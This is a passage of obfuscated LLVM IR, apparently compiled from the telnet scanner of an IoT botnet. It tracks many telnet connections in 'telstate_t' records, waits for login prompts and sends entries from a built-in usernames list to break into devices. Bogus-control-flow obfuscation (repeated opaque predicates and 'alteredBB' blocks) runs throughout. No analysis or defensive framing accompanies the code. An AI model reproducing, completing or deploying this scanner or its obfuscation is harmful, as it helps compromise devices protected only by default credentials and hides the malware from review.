  br i1 %345, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %337
  %346 = call i32* @__errno_location() #13
  %347 = load i32, i32* %346, align 4
  %348 = icmp ne i32 %347, 115
  %349 = load i32, i32* @x.63
  %350 = load i32, i32* @y.64
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %348, label %357, label %368

; <label>:357:                                    ; preds = %originalBBpart243
  %358 = load i32, i32* %4, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 16
  %363 = call i32 @sclose(i32 %362)
  %364 = load i32, i32* %4, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 3
  store i8 1, i8* %367, align 1
  br label %377

; <label>:368:                                    ; preds = %originalBBpart243, %315
  %369 = load i32, i32* %4, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 2
  store i8 1, i8* %372, align 8
  %373 = load i32, i32* %4, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 6
  store i32 0, i32* %376, align 4
  br label %377

; <label>:377:                                    ; preds = %368, %357
  %378 = load i32, i32* @x.63
  %379 = load i32, i32* @y.64
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %377
  %386 = load i32, i32* @x.63
  %387 = load i32, i32* @y.64
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %1843

; <label>:394:                                    ; preds = %originalBBpart219
  %395 = load i32, i32* %4, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 6
  %399 = load i32, i32* %398, align 4
  %400 = icmp eq i32 %399, 0
  br i1 %400, label %401, label %407

; <label>:401:                                    ; preds = %394
  %402 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %403 = load i32, i32* %4, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 6
  store i32 %402, i32* %406, align 4
  br label %407

; <label>:407:                                    ; preds = %401, %394
  %408 = load i32, i32* @x.63
  %409 = load i32, i32* @y.64
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %407
  %416 = load i32, i32* @x.63
  %417 = load i32, i32* @y.64
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %424

; <label>:424:                                    ; preds = %originalBBpart251
  %425 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i32 0, i32 0
  %426 = getelementptr inbounds [16 x i64], [16 x i64]* %425, i64 0, i64 0
  %427 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %426) #2, !srcloc !5
  %428 = extractvalue { i64, i64* } %427, 0
  %429 = extractvalue { i64, i64* } %427, 1
  %430 = trunc i64 %428 to i32
  store i32 %430, i32* %14, align 4
  %431 = ptrtoint i64* %429 to i64
  %432 = trunc i64 %431 to i32
  store i32 %432, i32* %15, align 4
  br label %433

; <label>:433:                                    ; preds = %424
  br label %434

; <label>:434:                                    ; preds = %433
  %435 = load i32, i32* %4, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 16
  %440 = srem i32 %439, 64
  %441 = zext i32 %440 to i64
  %442 = shl i64 1, %441
  %443 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i32 0, i32 0
  %444 = load i32, i32* %4, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 0
  %448 = load i32, i32* %447, align 16
  %449 = sdiv i32 %448, 64
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds [16 x i64], [16 x i64]* %443, i64 0, i64 %450
  %452 = load i64, i64* %451, align 8
  %453 = or i64 %452, %442
  store i64 %453, i64* %451, align 8
  %454 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 0
  store i64 0, i64* %454, align 8
  %455 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 1
  store i64 10000, i64* %455, align 8
  %456 = load i32, i32* %4, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 16
  %461 = add nsw i32 %460, 1
  %462 = call i32 @select(i32 %461, %struct.__sigset_t* null, %struct.__sigset_t* %6, %struct.__sigset_t* null, %struct.timeval* %7)
  store i32 %462, i32* %5, align 4
  %463 = load i32, i32* %5, align 4
  %464 = icmp eq i32 %463, 1
  br i1 %464, label %465, label %538

; <label>:465:                                    ; preds = %434
  store i32 4, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %466 = load i32, i32* %4, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = bitcast i32* %9 to i8*
  %472 = call i32 @getsockopt(i32 %470, i32 1, i32 4, i8* %471, i32* %8) #2
  %473 = load i32, i32* %9, align 4
  %474 = icmp ne i32 %473, 0
  br i1 %474, label %475, label %490

; <label>:475:                                    ; preds = %465
  %476 = load i32, i32* %4, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 16
  %481 = call i32 @sclose(i32 %480)
  %482 = load i32, i32* %4, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 2
  store i8 0, i8* %485, align 8
  %486 = load i32, i32* %4, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 3
  store i8 1, i8* %489, align 1
  br label %521

; <label>:490:                                    ; preds = %465
  %491 = load i32, i32* %4, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 0
  %495 = load i32, i32* %494, align 16
  %496 = load i32, i32* %4, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 16
  %501 = call i32 (i32, i32, ...) @fcntl(i32 %500, i32 3, i8* null)
  %502 = and i32 %501, -2049
  %503 = call i32 (i32, i32, ...) @fcntl(i32 %495, i32 4, i32 %502)
  %504 = load i32, i32* %4, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 6
  store i32 0, i32* %507, align 4
  %508 = load i32, i32* %4, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 7
  store i16 0, i16* %511, align 16
  %512 = load i32, i32* %4, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 8
  %516 = load i8*, i8** %515, align 8
  call void @llvm.memset.p0i8.i64(i8* %516, i8 0, i64 1024, i32 1, i1 false)
  %517 = load i32, i32* %4, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 2
  store i8 2, i8* %520, align 8
  br label %1844

; <label>:521:                                    ; preds = %475
  %522 = load i32, i32* @x.63
  %523 = load i32, i32* @y.64
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %521
  %530 = load i32, i32* @x.63
  %531 = load i32, i32* @y.64
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %589

; <label>:538:                                    ; preds = %434
  %539 = load i32, i32* @x.63
  %540 = load i32, i32* @y.64
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %538
  %547 = load i32, i32* %5, align 4
  %548 = icmp eq i32 %547, -1
  %549 = load i32, i32* @x.63
  %550 = load i32, i32* @y.64
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %548, label %557, label %572

; <label>:557:                                    ; preds = %originalBBpart259
  %558 = load i32, i32* %4, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 16
  %563 = call i32 @sclose(i32 %562)
  %564 = load i32, i32* %4, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 2
  store i8 0, i8* %567, align 8
  %568 = load i32, i32* %4, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 3
  store i8 1, i8* %571, align 1
  br label %572

; <label>:572:                                    ; preds = %557, %originalBBpart259
  %573 = load i32, i32* @x.63
  %574 = load i32, i32* @y.64
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %572
  %581 = load i32, i32* @x.63
  %582 = load i32, i32* @y.64
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %589

; <label>:589:                                    ; preds = %originalBBpart263, %originalBBpart255
  %590 = load i32, i32* %4, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 6
  %594 = load i32, i32* %593, align 4
  %595 = add i32 %594, 5
  %596 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %597 = icmp ult i32 %595, %596
  br i1 %597, label %598, label %629

; <label>:598:                                    ; preds = %589
  %599 = load i32, i32* @x.63
  %600 = load i32, i32* @y.64
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %598
  %607 = load i32, i32* %4, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %608
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %609, i32 0, i32 0
  %611 = load i32, i32* %610, align 16
  %612 = call i32 @sclose(i32 %611)
  %613 = load i32, i32* %4, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 2
  store i8 0, i8* %616, align 8
  %617 = load i32, i32* %4, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 3
  store i8 1, i8* %620, align 1
  %621 = load i32, i32* @x.63
  %622 = load i32, i32* @y.64
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %629

; <label>:629:                                    ; preds = %originalBBpart267, %589
  %630 = load i32, i32* @x.63
  %631 = load i32, i32* @y.64
  %632 = sub i32 %630, 1
  %633 = mul i32 %630, %632
  %634 = urem i32 %633, 2
  %635 = icmp eq i32 %634, 0
  %636 = icmp slt i32 %631, 10
  %637 = or i1 %635, %636
  br i1 %637, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %629
  %638 = load i32, i32* @x.63
  %639 = load i32, i32* @y.64
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %1843

; <label>:646:                                    ; preds = %originalBBpart219
  %647 = load i32, i32* %4, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 6
  %651 = load i32, i32* %650, align 4
  %652 = icmp eq i32 %651, 0
  br i1 %652, label %653, label %675

; <label>:653:                                    ; preds = %646
  %654 = load i32, i32* @x.63
  %655 = load i32, i32* @y.64
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %653
  %662 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %663 = load i32, i32* %4, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 6
  store i32 %662, i32* %666, align 4
  %667 = load i32, i32* @x.63
  %668 = load i32, i32* @y.64
  %669 = sub i32 %667, 1
  %670 = mul i32 %667, %669
  %671 = urem i32 %670, 2
  %672 = icmp eq i32 %671, 0
  %673 = icmp slt i32 %668, 10
  %674 = or i1 %672, %673
  br i1 %674, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %675

; <label>:675:                                    ; preds = %originalBBpart275, %646
  %676 = load i32, i32* %4, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 0
  %680 = load i32, i32* %679, align 16
  %681 = load i32, i32* %4, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 8
  %685 = load i8*, i8** %684, align 8
  %686 = load i32, i32* %4, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 7
  %690 = load i16, i16* %689, align 16
  %691 = zext i16 %690 to i32
  %692 = call i32 @readUntil(i32 %680, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %685, i32 1024, i32 %691)
  %693 = icmp ne i32 %692, 0
  br i1 %693, label %694, label %712

; <label>:694:                                    ; preds = %675
  %695 = load i32, i32* %4, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 6
  store i32 0, i32* %698, align 4
  %699 = load i32, i32* %4, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 7
  store i16 0, i16* %702, align 16
  %703 = load i32, i32* %4, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %705, i32 0, i32 8
  %707 = load i8*, i8** %706, align 8
  call void @llvm.memset.p0i8.i64(i8* %707, i8 0, i64 1024, i32 1, i1 false)
  %708 = load i32, i32* %4, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 2
  store i8 3, i8* %711, align 8
  br label %1844

; <label>:712:                                    ; preds = %675
  %713 = load i32, i32* @x.63
  %714 = load i32, i32* @y.64
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %712
  %721 = load i32, i32* %4, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %722
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %723, i32 0, i32 8
  %725 = load i8*, i8** %724, align 8
  %726 = call i64 @strlen(i8* %725) #10
  %727 = trunc i64 %726 to i16
  %728 = load i32, i32* %4, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 7
  store i16 %727, i16* %731, align 16
  %732 = load i32, i32* @x.63
  %733 = load i32, i32* @y.64
  %734 = sub i32 %732, 1
  %735 = mul i32 %732, %734
  %736 = urem i32 %735, 2
  %737 = icmp eq i32 %736, 0
  %738 = icmp slt i32 %733, 10
  %739 = or i1 %737, %738
  br i1 %739, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %740

; <label>:740:                                    ; preds = %originalBBpart279
  %741 = load i32, i32* %4, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 6
  %745 = load i32, i32* %744, align 4
  %746 = add i32 %745, 30
  %747 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %748 = icmp ult i32 %746, %747
  br i1 %748, label %749, label %764

; <label>:749:                                    ; preds = %740
  %750 = load i32, i32* %4, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 0
  %754 = load i32, i32* %753, align 16
  %755 = call i32 @sclose(i32 %754)
  %756 = load i32, i32* %4, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 2
  store i8 0, i8* %759, align 8
  %760 = load i32, i32* %4, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %761
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %762, i32 0, i32 3
  store i8 1, i8* %763, align 1
  br label %764

; <label>:764:                                    ; preds = %749, %740
  %765 = load i32, i32* @x.63
  %766 = load i32, i32* @y.64
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %764
  %773 = load i32, i32* @x.63
  %774 = load i32, i32* @y.64
  %775 = sub i32 %773, 1
  %776 = mul i32 %773, %775
  %777 = urem i32 %776, 2
  %778 = icmp eq i32 %777, 0
  %779 = icmp slt i32 %774, 10
  %780 = or i1 %778, %779
  br i1 %780, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %1843

; <label>:781:                                    ; preds = %originalBBpart219
  %782 = load i32, i32* @x.63
  %783 = load i32, i32* @y.64
  %784 = sub i32 %782, 1
  %785 = mul i32 %782, %784
  %786 = urem i32 %785, 2
  %787 = icmp eq i32 %786, 0
  %788 = icmp slt i32 %783, 10
  %789 = or i1 %787, %788
  br i1 %789, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %781
  %790 = load i32, i32* %4, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 0
  %794 = load i32, i32* %793, align 16
  %795 = load i32, i32* %4, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 4
  %799 = load i8, i8* %798, align 2
  %800 = zext i8 %799 to i64
  %801 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %800
  %802 = load i8*, i8** %801, align 8
  %803 = load i32, i32* %4, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 4
  %807 = load i8, i8* %806, align 2
  %808 = zext i8 %807 to i64
  %809 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %808
  %810 = load i8*, i8** %809, align 8
  %811 = call i64 @strlen(i8* %810) #10
  %812 = call i64 @send(i32 %794, i8* %802, i64 %811, i32 16384)
  %813 = icmp slt i64 %812, 0
  %814 = load i32, i32* @x.63
  %815 = load i32, i32* @y.64
  %816 = sub i32 %814, 1
  %817 = mul i32 %814, %816
  %818 = urem i32 %817, 2
  %819 = icmp eq i32 %818, 0
  %820 = icmp slt i32 %815, 10
  %821 = or i1 %819, %820
  br i1 %821, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %813, label %822, label %837

; <label>:822:                                    ; preds = %originalBBpart287
  %823 = load i32, i32* %4, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 0
  %827 = load i32, i32* %826, align 16
  %828 = call i32 @sclose(i32 %827)
  %829 = load i32, i32* %4, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 2
  store i8 0, i8* %832, align 8
  %833 = load i32, i32* %4, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 3
  store i8 1, i8* %836, align 1
  br label %1844

; <label>:837:                                    ; preds = %originalBBpart287
  %838 = load i32, i32* %4, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 16
  %843 = call i64 @send(i32 %842, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %844 = icmp slt i64 %843, 0
  br i1 %844, label %845, label %860

; <label>:845:                                    ; preds = %837
  %846 = load i32, i32* %4, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 0
  %850 = load i32, i32* %849, align 16
  %851 = call i32 @sclose(i32 %850)
  %852 = load i32, i32* %4, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 2
  store i8 0, i8* %855, align 8
  %856 = load i32, i32* %4, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 3
  store i8 1, i8* %859, align 1
